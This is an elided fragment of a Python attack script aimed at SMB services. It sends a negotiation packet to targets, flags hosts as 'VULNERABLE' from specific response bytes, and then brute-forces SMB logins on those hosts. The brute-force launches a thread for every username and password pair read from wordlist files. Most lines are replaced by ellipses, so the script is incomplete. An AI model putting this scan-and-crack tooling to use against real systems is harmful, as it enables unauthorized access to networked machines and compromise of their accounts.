...
def conn(targets):
    ...
    try:
        ...
        creack_iplist.append(str(targets))
        s.send(packetnego)
            ...
            while True:
                ...
                if data[8:10] == "\x25\x05":
                    ...
                    if data[9:13] == "\x05\x02\x00\xc0":
                        message=("[+] "+str(targets)+" VULNERABLE ("+nativeos+")")
                        write_log(message)
                        vuln = 1
...
def creack_smb(ip,username,password):
    ...
    if scan_status_code:
        conn = SMBConnection(username, password, 'client_machine_name', ip, domain='', use_ntlm_v2=True, is_direct_tcp=True)
        try:
...
if SingleMultiScanCheck == 1:
    ...
    ''' crack '''
    for ip in creack_iplist:
        scan_status_code = True
        for username in open('username.txt','r'):
            for password in open('password.txt','r'):
                t = threading.Thread(target=creack_smb, args=(ip,username.strip(),password.strip()))
                threads2.append(t)
                t.start()
                time.sleep(0.01)
